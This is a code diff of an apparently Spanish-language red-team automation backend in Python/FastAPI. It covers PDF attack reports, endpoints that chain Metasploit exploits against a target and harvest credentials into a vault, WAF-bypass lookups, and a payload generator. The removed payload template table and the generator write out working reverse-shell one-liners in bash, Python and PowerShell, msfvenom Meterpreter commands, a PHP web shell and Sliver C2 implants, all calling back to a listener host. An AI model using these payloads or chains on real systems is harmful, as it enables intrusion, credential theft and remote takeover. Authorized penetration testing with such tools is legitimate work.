-        pdf.add_page()
-        pdf.set_font("Courier", "B", 14)
-        pdf.cell(0, 10, "ANALISIS TACTICO", ln=True)
-        pdf.set_font("Courier", "", 9)
-        
-        strategy = sanitize_for_pdf(final_tactical.get("overall_strategy", ""))
-        if strategy:
-            pdf.set_font("Courier", "B", 10)
-            pdf.cell(0, 8, "Estrategia general:", ln=True)
-            pdf.set_font("Courier", "", 9)
-            # Word wrap long text
-            for i in range(0, len(strategy), 90):
-                pdf.cell(0, 6, f"  {strategy[i:i+90]}", ln=True)
-        
-        waf_analysis = final_tactical.get("waf_analysis", {})
-        if waf_analysis and waf_analysis.get("waf_detected"):
-            pdf.ln(3)
-            pdf.set_font("Courier", "B", 10)
-            pdf.cell(0, 8, sanitize_for_pdf(f"WAF DETECTADO: {waf_analysis.get('waf_name','?')}"), ln=True)
-            pdf.set_font("Courier", "", 9)
-            alt = sanitize_for_pdf(waf_analysis.get("alternative_approach", ""))
-            pdf.cell(0, 6, f"  Bypass: {alt[:90]}", ln=True)
-        
-        priority_actions = final_tactical.get("priority_actions", [])
-        if priority_actions:
-            pdf.ln(3)
-            pdf.set_font("Courier", "B", 10)
-            pdf.cell(0, 8, "ACCIONES PRIORITARIAS:", ln=True)
-            pdf.set_font("Courier", "", 9)
-            for action in priority_actions:
-                pdf.cell(0, 6, sanitize_for_pdf(f"  [P{action.get('priority',0)}] {action.get('action','')}"), ln=True)
-                details = sanitize_for_pdf(action.get('details', ''))
-                if details:
-                    pdf.cell(0, 6, f"       {details[:80]}", ln=True)
-    
-    # AI Analysis
-    ai_analysis = scan.get("ai_analysis", "")
-    if ai_analysis and ai_analysis != "API key not configured":
-        pdf.add_page()
-        pdf.set_font("Courier", "B", 14)
-        pdf.cell(0, 10, "ANALISIS DE IA (KIMI K2)", ln=True)
-        pdf.set_font("Courier", "", 9)
-        
-        # Sanitize and split AI text into lines
-        ai_analysis = sanitize_for_pdf(ai_analysis)
-        for i in range(0, len(ai_analysis), 90):
-            chunk = ai_analysis[i:i+90]
-            try:
-                pdf.cell(0, 6, chunk, ln=True)
-            except Exception:
-                pdf.cell(0, 6, chunk.encode('ascii', 'replace').decode(), ln=True)
-    
-    # Suggested chains
-    suggested = scan.get("suggested_chains", [])
-    if suggested:
-        pdf.ln(5)
-        pdf.set_font("Courier", "B", 14)
-        pdf.cell(0, 10, "CADENAS DE ATAQUE SUGERIDAS", ln=True)
-        pdf.set_font("Courier", "", 9)
-        pdf.cell(0, 7, "Basado en lo que encontramos, estas cadenas aplican:", ln=True)
-        pdf.ln(2)
-        for chain in suggested:
-            pdf.set_font("Courier", "B", 10)
-            pdf.cell(0, 7, sanitize_for_pdf(f"  >> {chain.get('name','')} ({chain.get('total_steps',0)} pasos)"), ln=True)
-            pdf.set_font("Courier", "", 9)
-            pdf.cell(0, 6, sanitize_for_pdf(f"     {chain.get('description','')}"), ln=True)
-            pdf.cell(0, 6, sanitize_for_pdf(f"     Trigger: {chain.get('trigger_matched','')}"), ln=True)
-            pdf.ln(2)
-    
-    # Recommended modules
-    rec_modules = scan.get("recommended_modules", [])
-    if rec_modules:
-        pdf.ln(3)
-        pdf.set_font("Courier", "B", 14)
-        pdf.cell(0, 10, "MODULOS MSF RECOMENDADOS", ln=True)
-        pdf.set_font("Courier", "", 9)
-        for mod in rec_modules[:10]:
-            pdf.set_font("Courier", "B", 9)
-            pdf.cell(0, 7, f"  {mod.get('name','')}", ln=True)
-            pdf.set_font("Courier", "", 9)
-            reasons = ', '.join(mod.get('reasons', []))
-            pdf.cell(0, 6, f"    {mod.get('desc','')} | Score: {mod.get('relevance_score',0)} | {reasons}", ln=True)
-    
-    # Footer
-    pdf.ln(10)
-    pdf.line(10, pdf.get_y(), 200, pdf.get_y())
-    pdf.ln(3)
+    pdf.ln(5)
     pdf.set_font("Courier", "I", 9)
-    pdf.cell(0, 7, "Generado por Red Team Automation Framework v3.2", ln=True, align="C")
-    pdf.cell(0, 7, "Este reporte es para uso interno del equipo. No distribuir.", ln=True, align="C")
-    
-    # Generate PDF bytes
+    pdf.cell(0, 7, "Generado por Red Team Framework v6.0", ln=True, align="C")
     pdf_bytes = pdf.output()
     buffer = io.BytesIO(pdf_bytes)
     buffer.seek(0)
-    
     filename = f"redteam-report-{scan.get('target','unknown')}-{scan_id[:8]}.pdf"
-    return StreamingResponse(
-        buffer,
-        media_type="application/pdf",
-        headers={"Content-Disposition": f"attachment; filename={filename}"}
-    )
+    return StreamingResponse(buffer, media_type="application/pdf", headers={"Content-Disposition": f"attachment; filename={filename}"})
 
 @api_router.delete("/scan/{scan_id}")
 async def delete_scan(scan_id: str):
-    await db.scans.delete_one({"id": scan_id})
+    await repo.scan_delete(scan_id)
     scan_progress.pop(scan_id, None)
     attack_trees.pop(scan_id, None)
     return {"message": "Deleted"}
-
-# =============================================================================
-# ATTACK CHAINS API
-# =============================================================================
-@api_router.get("/chains")
-async def get_attack_chains():
-    """Get all available attack chains"""
-    chains = []
-    for chain_id, chain in AttackChainEngine.ATTACK_CHAINS.items():
-        chains.append({
-            "id": chain_id,
-            "name": chain["name"],
-            "description": chain["description"],
-            "triggers": chain["trigger"],
-            "steps_count": len(chain["steps"])
-        })
-    return {"chains": chains}
-
-@api_router.get("/chains/{chain_id}")
-async def get_chain_details(chain_id: str):
-    """Get full details of an attack chain"""
-    chain = AttackChainEngine.get_chain_details(chain_id)
-    if not chain:
-        raise HTTPException(status_code=404, detail="Chain not found")
-    return chain
-
-@api_router.post("/chains/{chain_id}/generate")
-async def generate_chain_commands(chain_id: str, context: Dict[str, Any]):
-    """Generate executable commands for a chain with context variables"""
-    effective_lhost = context.get("lhost", "") or get_effective_lhost()
-    effective_lport = context.get("lport", "") or str(global_config.get("listener_port", 4444))
-    full_context = {"lhost": effective_lhost, "lport": effective_lport, **context, "lhost": effective_lhost, "lport": effective_lport}
-    commands = AttackChainEngine.generate_chain_commands(chain_id, full_context)
-    if not commands:
-        raise HTTPException(status_code=404, detail="Chain not found")
-    return {"chain_id": chain_id, "commands": commands}
-
-@api_router.post("/chains/detect")
-async def detect_applicable_chains(findings: Dict[str, Any]):
-    """Detect which attack chains apply based on scan findings"""
-    applicable = AttackChainEngine.get_applicable_chains(findings)
-    return {"applicable_chains": applicable, "count": len(applicable)}
-
-class ChainExecutionRequest(BaseModel):
-    scan_id: str
-    chain_id: str
-    target: str
-    context: Dict[str, str] = {}
-    auto_execute: bool = False
-
-@api_router.post("/chains/execute")
-async def execute_chain(request: ChainExecutionRequest, background_tasks: BackgroundTasks):
-    """Execute an attack chain (manual or auto)"""
-    chain = AttackChainEngine.get_chain_details(request.chain_id)
-    if not chain:
-        raise HTTPException(status_code=404, detail="Chain not found")
-    
-    execution_id = str(uuid.uuid4())
-    effective_lhost = request.context.get("lhost", "") or get_effective_lhost()
-    context = {"target": request.target, "lhost": effective_lhost, **request.context, "lhost": effective_lhost}
-    commands = AttackChainEngine.generate_chain_commands(request.chain_id, context)
-    
-    # Build initial step statuses
-    step_statuses = {}
-    for cmd in commands:
-        step_statuses[str(cmd["step_id"])] = {
-            "step_id": cmd["step_id"],
-            "step_name": cmd["step_name"],
-            "status": "pending",
-            "command_results": []
-        }
-    
-    active_chains[execution_id] = {
-        "id": execution_id,
-        "scan_id": request.scan_id,
-        "chain_id": request.chain_id,
-        "chain_name": chain["name"],
-        "target": request.target,
-        "status": "ready",
-        "current_step": 0,
-        "total_steps": len(commands),
-        "progress": 0,
-        "commands": commands,
-        "step_statuses": step_statuses,
-        "results": [],
-        "created_at": datetime.now(timezone.utc).isoformat()
-    }
-    
-    # If auto_execute, run in background
-    if request.auto_execute:
-        active_chains[execution_id]["status"] = "running"
-        background_tasks.add_task(run_chain_background, execution_id)
-    
-    return {
-        "execution_id": execution_id,
-        "chain_id": request.chain_id,
-        "chain_name": chain["name"],
-        "status": active_chains[execution_id]["status"],
-        "total_steps": len(commands),
-        "step_statuses": step_statuses,
-        "commands": commands
-    }
-
-async def run_chain_background(execution_id: str):
-    """Background task to execute chain steps with conditional evaluation and credential injection"""
-    import asyncio
-    chain_exec = active_chains.get(execution_id)
-    if not chain_exec:
-        return
-    
-    scan_id = chain_exec.get("scan_id", "")
-    target = chain_exec["target"]
-    chain_exec["started_at"] = datetime.now(timezone.utc).isoformat()
-    total_steps = len(chain_exec["commands"])
-    
-    for i, step in enumerate(chain_exec["commands"]):
-        chain_exec["current_step"] = i + 1
-        chain_exec["progress"] = int((i / total_steps) * 100)
-        
-        step_status = {
-            "step_id": step["step_id"],
-            "step_name": step["step_name"],
-            "status": "running",
-            "started_at": datetime.now(timezone.utc).isoformat(),
-            "command_results": [],
-            "skipped": False,
-            "skip_reason": ""
-        }
-        
-        if "step_statuses" not in chain_exec:
-            chain_exec["step_statuses"] = {}
-        chain_exec["step_statuses"][str(step["step_id"])] = step_status
-        
-        # === CONDITIONAL EVALUATION (Point 4) ===
-        condition_met = True
-        for cmd in step["commands"]:
-            condition = cmd.get("condition", "")
-            if condition:
-                vault_ctx = credential_vault.get_context(scan_id) if scan_id else {}
-                results = scan_progress.get(scan_id, {}).get("results", {})
-                results_text = json.dumps(results).lower()
-                
-                if condition == "sqli" and "sql injection" not in results_text and "sqlmap" not in results_text:
-                    condition_met = False
-                    step_status["skip_reason"] = f"Condition '{condition}' not met - no SQLi detected"
-                elif condition == "shell" and not session_manager.has_active(scan_id):
-                    condition_met = False
-                    step_status["skip_reason"] = f"Condition '{condition}' not met - no active session"
-                elif condition == "linux" and vault_ctx.get("os_info", {}).get("os") != "linux":
-                    condition_met = False
-                    step_status["skip_reason"] = f"Condition '{condition}' not met - OS is not Linux"
-                elif condition == "windows" and vault_ctx.get("os_info", {}).get("os") != "windows":
-                    condition_met = False
-                    step_status["skip_reason"] = f"Condition '{condition}' not met - OS is not Windows"
-                elif condition == "creds" and not credential_vault.get_credentials(scan_id):
-                    condition_met = False
-                    step_status["skip_reason"] = f"Condition '{condition}' not met - no credentials in vault"
-        
-        if not condition_met:
-            step_status["status"] = "skipped"
-            step_status["skipped"] = True
-            step_status["completed_at"] = datetime.now(timezone.utc).isoformat()
-            chain_exec["results"].append(step_status)
-            await asyncio.sleep(0.2)
-            continue
-        
-        # === EXECUTE STEP WITH CREDENTIAL INJECTION (Point 3) ===
-        step_success = True
-        for cmd in step["commands"]:
-            try:
-                # Inject credentials from vault
-                command_str = cmd.get("command", "")
-                if scan_id:
-                    command_str = credential_vault.inject_context(command_str, scan_id, target, chain_exec.get("context", {}))
-                
-                if cmd.get("module"):
-                    result = await run_metasploit(cmd["module"], target, None, {}, chain_exec.get("lhost"), 4444)
-                    
-                    # Parse credentials from exploit output
-                    output = result.get("output", "")
-                    if isinstance(output, str) and scan_id:
-                        for cred in CredentialVault.parse_credentials_from_output(output, cmd["module"], target):
-                            credential_vault.add_credential(scan_id, cred)
-                    
-                    # Check for session
-                    if result.get("session_opened") and scan_id:
-                        session_manager.register(scan_id, {"id": f"chain_{execution_id}_{step['step_id']}", "host": target, "type": "shell", "source": cmd["module"]})
-                else:
-                    await asyncio.sleep(1)
-                    result = {
-                        "command": command_str,
-                        "tool": cmd.get("tool", "shell"),
-                        "simulated": True,
-                        "success": True,
-                        "output": f"[SIM] Executed: {command_str[:120]}"
-                    }
-                step_status["command_results"].append(result)
-            except Exception as e:
-                step_status["command_results"].append({"error": str(e), "success": False})
-                step_success = False
-        
-        step_status["status"] = "completed" if step_success else "failed"
-        step_status["completed_at"] = datetime.now(timezone.utc).isoformat()
-        chain_exec["results"].append(step_status)
-        
-        await asyncio.sleep(0.5)
-    
-    chain_exec["status"] = "completed"
-    chain_exec["progress"] = 100
-    chain_exec["completed_at"] = datetime.now(timezone.utc).isoformat()
-    
-    # Save vault after chain
-    if scan_id:
-        chain_exec["vault_summary"] = credential_vault.get_vault_summary(scan_id)
-        await credential_vault.save_to_db(scan_id)
-    
-    save_data = {k: v for k, v in chain_exec.items()}
-    await db.chain_executions.insert_one({"id": execution_id, **save_data})
-
-@api_router.get("/chains/execution/{execution_id}")
-async def get_chain_execution_status(execution_id: str):
-    """Get status of a chain execution with step-level progress"""
-    if execution_id in active_chains:
-        chain = active_chains[execution_id]
-        return {
-            "id": chain["id"],
-            "chain_id": chain["chain_id"],
-            "chain_name": chain["chain_name"],
-            "target": chain["target"],
-            "status": chain["status"],
-            "current_step": chain["current_step"],
-            "total_steps": chain["total_steps"],
-            "progress": chain.get("progress", 0),
-            "step_statuses": chain.get("step_statuses", {}),
-            "results": chain.get("results", []),
-            "created_at": chain.get("created_at"),
-            "completed_at": chain.get("completed_at")
-        }
-    
-    exec_doc = await db.chain_executions.find_one({"id": execution_id}, {"_id": 0})
-    if exec_doc:
-        return exec_doc
-    
-    raise HTTPException(status_code=404, detail="Execution not found")
-
-@api_router.post("/chains/execution/{execution_id}/step/{step_id}")
-async def execute_chain_step(execution_id: str, step_id: int):
-    """Manually execute a specific step in a chain"""
-    chain_exec = active_chains.get(execution_id)
-    if not chain_exec:
-        raise HTTPException(status_code=404, detail="Execution not found")
-    
-    step = None
-    for s in chain_exec["commands"]:
-        if s["step_id"] == step_id:
-            step = s
-            break
-    
-    if not step:
-        raise HTTPException(status_code=404, detail="Step not found")
-    
-    # Update step status to running
-    if "step_statuses" not in chain_exec:
-        chain_exec["step_statuses"] = {}
-    chain_exec["step_statuses"][str(step_id)] = {
-        "step_id": step_id,
-        "step_name": step["step_name"],
-        "status": "running",
-        "started_at": datetime.now(timezone.utc).isoformat(),
-        "command_results": []
-    }
-    
-    step_results = chain_exec["step_statuses"][str(step_id)]
-    step_success = True
-    
-    for cmd in step["commands"]:
-        try:
-            if cmd.get("module"):
-                result = await run_metasploit(cmd["module"], chain_exec["target"], None, {}, None, 4444)
-            else:
-                result = {
-                    "command": cmd["command"],
-                    "tool": cmd.get("tool", "shell"),
-                    "simulated": True,
-                    "success": True,
-                    "output": f"[SIM] Executed: {cmd['command'][:120]}"
-                }
-            step_results["command_results"].append(result)
-        except Exception as e:
-            step_results["command_results"].append({"error": str(e), "success": False})
-            step_success = False
-    
-    step_results["status"] = "completed" if step_success else "failed"
-    step_results["completed_at"] = datetime.now(timezone.utc).isoformat()
-    chain_exec["results"].append(step_results)
-    chain_exec["current_step"] = step_id
-    
-    # Update progress
-    completed_steps = sum(1 for s in chain_exec.get("step_statuses", {}).values() if s.get("status") in ["completed", "failed"])
-    chain_exec["progress"] = int((completed_steps / chain_exec["total_steps"]) * 100)
-    
-    # Check if all steps done
-    if completed_steps >= chain_exec["total_steps"]:
-        chain_exec["status"] = "completed"
-        chain_exec["completed_at"] = datetime.now(timezone.utc).isoformat()
-    
-    return step_results
 
 
 # ============ VAULT & TIMELINE ENDPOINTS ============
 
 @api_router.get("/scan/{scan_id}/vault")
 async def get_scan_vault(scan_id: str):
-    """Get credential vault contents for a scan"""
     summary = credential_vault.get_vault_summary(scan_id)
     creds = credential_vault.get_credentials(scan_id)
-    # Mask sensitive values
     safe_creds = []
     for c in creds:
         safe = {**c}
@@ -2193,159 +1371,66 @@ async def get_scan_vault(scan_id: str):
 
 @api_router.get("/scan/{scan_id}/timeline")
 async def get_scan_timeline(scan_id: str):
-    """Get chronological attack timeline"""
     if scan_id in scan_progress:
         return {"timeline": scan_progress[scan_id].get("timeline", []), "adaptive_log": scan_progress[scan_id].get("adaptive_log", [])}
-    scan = await db.scans.find_one({"id": scan_id}, {"_id": 0, "timeline": 1, "adaptive_log": 1})
+    scan = await repo.scan_get(scan_id)
     if scan:
-        return {"timeline": scan.get("timeline", []), "adaptive_log": scan.get("adaptive_log", [])}
+        return {"timeline": scan.get("timeline", []), "adaptive_log": []}
     raise HTTPException(status_code=404, detail="Not found")
 
 @api_router.get("/scan/{scan_id}/sessions")
 async def get_scan_sessions(scan_id: str):
-    """Get active sessions for a scan"""
     sessions = session_manager.get_sessions(scan_id)
     post_actions = session_manager.get_post_exploit_actions(scan_id)
     return {"sessions": sessions, "post_exploit_actions": post_actions}
 
 @api_router.post("/scan/{scan_id}/abort")
 async def abort_scan(scan_id: str):
-    """Abort a running scan"""
     if scan_id in scan_progress and scan_progress[scan_id]["status"] == "running":
         scan_progress[scan_id]["status"] = "aborted"
-        scan_progress[scan_id]["progress"] = scan_progress[scan_id].get("progress", 0)
         return {"status": "aborted", "scan_id": scan_id}
     raise HTTPException(status_code=400, detail="Scan not running")
 
-# ============ PAYLOAD GENERATOR ============
 
-PAYLOAD_TEMPLATES = {
-    "windows/meterpreter/reverse_tcp": {
-        "name": "Windows Meterpreter Reverse TCP",
-        "platform": "windows",
-        "arch": "x64",
-        "type": "staged",
-        "generator": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output}",
-        "handler": "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; exploit -j\"",
-        "output_ext": "exe",
-        "description": "Staged Meterpreter. Requires handler listening. Full post-exploitation capabilities."
-    },
-    "windows/meterpreter/reverse_https": {
-        "name": "Windows Meterpreter Reverse HTTPS",
-        "platform": "windows",
-        "arch": "x64",
-        "type": "staged",
-        "generator": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST={lhost} LPORT={lport} -f exe -o {output}",
-        "handler": "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; exploit -j\"",
-        "output_ext": "exe",
-        "description": "Encrypted HTTPS channel. Evades basic network inspection. Requires SSL cert on handler."
-    },
-    "windows/shell_reverse_tcp": {
-        "name": "Windows Shell Reverse TCP",
-        "platform": "windows",
-        "arch": "x64",
-        "type": "stageless",
-        "generator": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output}",
-        "handler": "nc -lvnp {lport}",
-        "output_ext": "exe",
-        "description": "Simple CMD shell. No Meterpreter features. Caught by nc/ncat listener."
-    },
-    "linux/shell_reverse_tcp": {
-        "name": "Linux Shell Reverse TCP",
-        "platform": "linux",
-        "arch": "x64",
-        "type": "stageless",
-        "generator": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {output}",
-        "handler": "nc -lvnp {lport}",
-        "output_ext": "elf",
-        "description": "ELF binary reverse shell. chmod +x required. Caught by nc listener."
-    },
-    "linux/meterpreter/reverse_tcp": {
-        "name": "Linux Meterpreter Reverse TCP",
-        "platform": "linux",
-        "arch": "x64",
-        "type": "staged",
-        "generator": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {output}",
-        "handler": "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit -j\"",
-        "output_ext": "elf",
-        "description": "Linux Meterpreter. Full post-exploitation. Requires MSF handler."
-    },
-    "php/reverse_php": {
-        "name": "PHP Reverse Shell",
-        "platform": "php",
-        "arch": "any",
-        "type": "stageless",
-        "generator": "msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw -o {output}",
-        "handler": "nc -lvnp {lport}",
-        "output_ext": "php",
-        "description": "PHP web shell for upload vulns. Caught by nc. Add <?php ?> tags if needed."
-    },
-    "bash_reverse": {
-        "name": "Bash One-Liner Reverse Shell",
-        "platform": "linux",
-        "arch": "any",
-        "type": "oneliner",
-        "generator": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
-        "handler": "nc -lvnp {lport}",
-        "output_ext": None,
-        "description": "No binary needed. Execute directly on target. Requires /dev/tcp support."
-    },
-    "python_reverse": {
-        "name": "Python Reverse Shell",
-        "platform": "any",
-        "arch": "any",
-        "type": "oneliner",
-        "generator": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
-        "handler": "nc -lvnp {lport}",
-        "output_ext": None,
-        "description": "Cross-platform. Requires python3 on target. No file drops."
-    },
-    "powershell_reverse": {
-        "name": "PowerShell Reverse Shell",
-        "platform": "windows",
-        "arch": "any",
-        "type": "oneliner",
-        "generator": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}}\"",
-        "handler": "nc -lvnp {lport}",
-        "output_ext": None,
-        "description": "No binary drop. Runs in memory. May trigger AMSI/Defender."
-    },
-    "sliver_session": {
-        "name": "Sliver Session Implant",
-        "platform": "linux",
-        "arch": "amd64",
-        "type": "implant",
-        "generator": "sliver > generate --mtls {lhost}:{lport} --os {platform} --arch {arch} --save {output}",
-        "handler": "sliver > mtls --lhost {lhost} --lport {lport}",
-        "output_ext": "elf",
-        "description": "Sliver C2 implant. Encrypted mTLS. Session-based. Use Sliver console."
-    },
-    "sliver_beacon": {
-        "name": "Sliver Beacon Implant",
-        "platform": "linux",
-        "arch": "amd64",
-        "type": "implant",
-        "generator": "sliver > generate beacon --mtls {lhost}:{lport} --os {platform} --arch {arch} --seconds 60 --jitter 30 --save {output}",
-        "handler": "sliver > mtls --lhost {lhost} --lport {lport}",
-        "output_ext": "elf",
-        "description": "Sliver C2 beacon. Async check-in every 60s. Stealthier than sessions."
-    },
-}
+# ============ MITRE & TACTICAL ============
+
+@api_router.get("/mitre/tactics")
+async def get_mitre_tactics():
+    return {"tactics": MITRE_TACTICS}
+
+@api_router.get("/tools")
+async def get_tools(phase: str = None):
+    tools = {k: v for k, v in RED_TEAM_TOOLS.items() if not phase or v["phase"] == phase}
+    return {"tools": tools}
+
+@api_router.get("/tactical/waf-bypass/{waf_name}")
+async def get_waf_bypass_strategy(waf_name: str):
+    waf_lower = waf_name.lower()
+    for key, strategy in TacticalDecisionEngine.WAF_BYPASS_STRATEGIES.items():
+        if key in waf_lower:
+            return strategy
+    return TacticalDecisionEngine.WAF_BYPASS_STRATEGIES["default"]
+
+@api_router.get("/tactical/service-attacks")
+async def get_service_attacks():
+    return {"strategies": TacticalDecisionEngine.SERVICE_ATTACK_MAP}
+
+@api_router.get("/tactical/vuln-exploits")
+async def get_vuln_exploits():
+    return {"mappings": TacticalDecisionEngine.VULN_EXPLOIT_MAP}
+
+
+# ============ PAYLOAD ENDPOINTS ============
 
 @api_router.get("/payloads/templates")
 async def get_payload_templates():
-    """List all available payload templates with LHOST/LPORT pre-filled"""
     lhost = get_effective_lhost()
     lport = str(global_config.get("listener_port", 4444))
     templates = []
     for pid, pt in PAYLOAD_TEMPLATES.items():
         templates.append({
-            "id": pid,
-            "name": pt["name"],
-            "platform": pt["platform"],
-            "arch": pt["arch"],
-            "type": pt["type"],
-            "description": pt["description"],
+            "id": pid, "name": pt["name"], "platform": pt["platform"],
+            "arch": pt["arch"], "type": pt["type"], "description": pt["description"],
             "generator_cmd": pt["generator"].format(lhost=lhost or "YOUR_IP", lport=lport, output=f"payload.{pt['output_ext'] or 'txt'}", platform=pt["platform"], arch=pt["arch"]),
             "handler_cmd": pt["handler"].format(lhost=lhost or "YOUR_IP", lport=lport),
             "lhost_configured": bool(lhost),
@@ -2354,121 +1439,245 @@ async def get_payload_templates():
 
 @api_router.post("/payloads/generate")
 async def generate_payload(data: Dict[str, Any]):
-    """Generate a real payload using msfvenom or return the exact command to run"""
     payload_id = data.get("payload_id", "")
     template = PAYLOAD_TEMPLATES.get(payload_id)
     if not template:
         raise HTTPException(status_code=404, detail=f"Unknown payload: {payload_id}")
-    
     lhost = data.get("lhost") or get_effective_lhost()
     lport = str(data.get("lport") or global_config.get("listener_port", 4444))
     platform = data.get("platform", template["platform"])
     arch = data.get("arch", template["arch"])
     output_name = data.get("output", f"payload_{payload_id.replace('/', '_')}.{template['output_ext'] or 'txt'}")
-    
     if not lhost:
-        raise HTTPException(status_code=400, detail="LHOST not configured. Set it in Config > Listener IP first.")
-    
+        raise HTTPException(status_code=400, detail="LHOST not configured.")
     generator_cmd = template["generator"].format(lhost=lhost, lport=lport, output=output_name, platform=platform, arch=arch)
     handler_cmd = template["handler"].format(lhost=lhost, lport=lport)
-    
-    result = {
-        "payload_id": payload_id,
-        "name": template["name"],
-        "type": template["type"],
-        "platform": platform,
-        "arch": arch,
-        "lhost": lhost,
-        "lport": lport,
-        "generator_cmd": generator_cmd,
-        "handler_cmd": handler_cmd,
-        "output_file": output_name if template["output_ext"] else None,
-        "description": template["description"],
-    }
-    
-    # For oneliners, the generator IS the payload - no file needed
+    result = {"payload_id": payload_id, "name": template["name"], "type": template["type"], "platform": platform, "arch": arch, "lhost": lhost, "lport": lport, "generator_cmd": generator_cmd, "handler_cmd": handler_cmd, "output_file": output_name if template["output_ext"] else None, "description": template["description"]}
     if template["type"] == "oneliner":
         result["payload_content"] = generator_cmd
         result["execution_method"] = "Copy and paste directly on target"
         return result
-    
-    # For binary payloads, try to generate with msfvenom if available
     if template["type"] in ("staged", "stageless"):
         try:
             output_path = f"/tmp/{output_name}"
-            gen_result = subprocess.run(
-                generator_cmd.split(),
-                capture_output=True, text=True, timeout=120
-            )
+            gen_result = subprocess.run(generator_cmd.split(), capture_output=True, text=True, timeout=120)
             if gen_result.returncode == 0 and os.path.exists(output_path):
-                file_size = os.path.getsize(output_path)
                 result["generated"] = True
                 result["file_path"] = output_path
-                result["file_size"] = file_size
-                result["execution_method"] = f"Transfer {output_name} to target and execute. Start handler first: {handler_cmd}"
+                result["file_size"] = os.path.getsize(output_path)
+                result["execution_method"] = f"Transfer {output_name} to target. Start handler: {handler_cmd}"
             else:
                 result["generated"] = False
                 result["error"] = gen_result.stderr[:300] if gen_result.stderr else "Generation failed"
-                result["execution_method"] = f"Run manually on your Kali: {generator_cmd}"
+                result["execution_method"] = f"Run manually: {generator_cmd}"
         except FileNotFoundError:
             result["generated"] = False
-            result["error"] = "msfvenom not found (run on Kali Linux)"
-            result["execution_method"] = f"Run on your Kali: {generator_cmd}"
+            result["error"] = "msfvenom not found"
+            result["execution_method"] = f"Run on Kali: {generator_cmd}"
         except Exception as e:
             result["generated"] = False
             result["error"] = str(e)
-            result["execution_method"] = f"Run on your Kali: {generator_cmd}"
     elif template["type"] == "implant":
         result["generated"] = False
         result["execution_method"] = f"Run in Sliver console: {generator_cmd}"
-    
     return result
 
 
+# ============ ATTACK CHAINS API ============
 
-# ============ DYNAMIC TOOL CATALOG (Point 6) ============
+@api_router.get("/chains")
+async def get_attack_chains():
+    chains = []
+    for chain_id, chain in AttackChainEngine.ATTACK_CHAINS.items():
+        chains.append({"id": chain_id, "name": chain["name"], "description": chain["description"], "triggers": chain["trigger"], "steps_count": len(chain["steps"])})
+    return {"chains": chains}
+
+@api_router.get("/chains/{chain_id}")
+async def get_chain_details(chain_id: str):
+    chain = AttackChainEngine.get_chain_details(chain_id)
+    if not chain:
+        raise HTTPException(status_code=404, detail="Chain not found")
+    return chain
+
+@api_router.post("/chains/{chain_id}/generate")
+async def generate_chain_commands(chain_id: str, context: Dict[str, Any]):
+    effective_lhost = context.get("lhost", "") or get_effective_lhost()
+    effective_lport = context.get("lport", "") or str(global_config.get("listener_port", 4444))
+    full_context = {**context, "lhost": effective_lhost, "lport": effective_lport}
+    commands = AttackChainEngine.generate_chain_commands(chain_id, full_context)
+    if not commands:
+        raise HTTPException(status_code=404, detail="Chain not found")
+    return {"chain_id": chain_id, "commands": commands}
+
+@api_router.post("/chains/detect")
+async def detect_applicable_chains(findings: Dict[str, Any]):
+    applicable = AttackChainEngine.get_applicable_chains(findings)
+    return {"applicable_chains": applicable, "count": len(applicable)}
+
+@api_router.post("/chains/execute")
+async def execute_chain(request: ChainExecutionRequest, background_tasks: BackgroundTasks):
+    chain = AttackChainEngine.get_chain_details(request.chain_id)
+    if not chain:
+        raise HTTPException(status_code=404, detail="Chain not found")
+    execution_id = str(uuid.uuid4())
+    effective_lhost = request.context.get("lhost", "") or get_effective_lhost()
+    context = {**request.context, "target": request.target, "lhost": effective_lhost}
+    commands = AttackChainEngine.generate_chain_commands(request.chain_id, context)
+    step_statuses = {}
+    for cmd in commands:
+        step_statuses[str(cmd["step_id"])] = {"step_id": cmd["step_id"], "step_name": cmd["step_name"], "status": "pending", "command_results": []}
+    active_chains[execution_id] = {
+        "id": execution_id, "scan_id": request.scan_id, "chain_id": request.chain_id,
+        "chain_name": chain["name"], "target": request.target, "status": "ready",
+        "current_step": 0, "total_steps": len(commands), "progress": 0,
+        "commands": commands, "step_statuses": step_statuses, "results": [],
+        "created_at": datetime.now(timezone.utc).isoformat(), "context": context
+    }
+    # Persist to SQLite
+    await repo.chain_exec_create(execution_id, request.chain_id, chain["name"], request.scan_id, request.target, commands, step_statuses, len(commands), context)
+    if request.auto_execute:
+        active_chains[execution_id]["status"] = "running"
+        background_tasks.add_task(run_chain_background, execution_id)
+    return {"execution_id": execution_id, "chain_id": request.chain_id, "chain_name": chain["name"], "status": active_chains[execution_id]["status"], "total_steps": len(commands), "step_statuses": step_statuses, "commands": commands}
+
+async def run_chain_background(execution_id: str):
+    chain_exec = active_chains.get(execution_id)
+    if not chain_exec:
+        return
+    scan_id = chain_exec.get("scan_id")
+    target = chain_exec["target"]
+    for step in chain_exec["commands"]:
+        if chain_exec["status"] != "running":
+            break
